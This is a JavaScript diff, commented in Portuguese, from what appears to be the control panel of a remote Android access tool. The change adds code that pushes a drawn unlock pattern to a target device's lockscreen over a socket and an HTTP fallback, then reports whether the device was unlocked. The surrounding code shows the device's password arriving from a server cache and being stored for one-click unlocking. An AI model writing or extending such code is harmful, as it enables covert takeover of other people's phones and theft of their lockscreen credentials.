@@ -532,12 +532,24 @@
     }
     function acaoDesbloquear() {
         if (_sequencia.length < 2) { log('Selecione ao menos 2 pontos.'); return; }
-        if (!_socket || !_socket.connected) { log('Socket offline.'); return; }
         const pontos = _sequencia.map(p => ({ x: p.x, y: p.y }));
-        _socket.emit('lockscreen_pattern_painel', { dispositivo: dispositivoAtual(), pontos });
-        // CORREÇÃO 2: registra o padrão desenhado no buffer (apenas se bloqueado).
+        const indices = _sequencia.map(p => p.indice);
+        const payload = { dispositivo: dispositivoAtual(), pontos, indices };
+
+        if (_socket && _socket.connected) {
+            _socket.emit('desbloquear_padrao', payload);
+            _socket.emit('lockscreen_pattern_painel', { dispositivo: dispositivoAtual(), pontos });
+        }
+        try {
+            fetch(window.location.origin + '/desbloquear-padrao-http', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(function(e) {});
+        } catch (e) {}
+
         registrarGestoDesbloqueio('padrao', { pontos: pontos });
-        log('Padrão enviado: ' + _sequencia.map(p => p.indice).join('→') + '.');
+        log('Padrão enviado: ' + indices.join('→') + '.');
     }
     function alternarModo(modo) {
         _modo = modo;
@@ -678,6 +690,14 @@
                 if (id && id === _dispositivoAtivo && salvarSenhaSalva(id, p.senhaSalva)) {
                     atualizarSeloAutoUnlock();
                     log('✅ Senha recebida do cache do servidor e salva localmente (botão de 1 clique ativado).');
+                }
+            });
+            _socket.on('desbloquear_padrao_resultado', function(res) {
+                if (res) {
+                    const ok = !!res.sucesso;
+                    log(ok ? '🔓 Padrão CORRETO — Dispositivo desbloqueado!' : '❌ Padrão INCORRETO ou falha.');
+                    const resEl = $('lock-resultado');
+                    if (resEl) resEl.textContent = ok ? '🔓 Desbloqueado com sucesso!' : '❌ Padrão incorreto.';
                 }
             });
             // CORREÇÃO 2: evento de sucesso do Android → salva a senha.
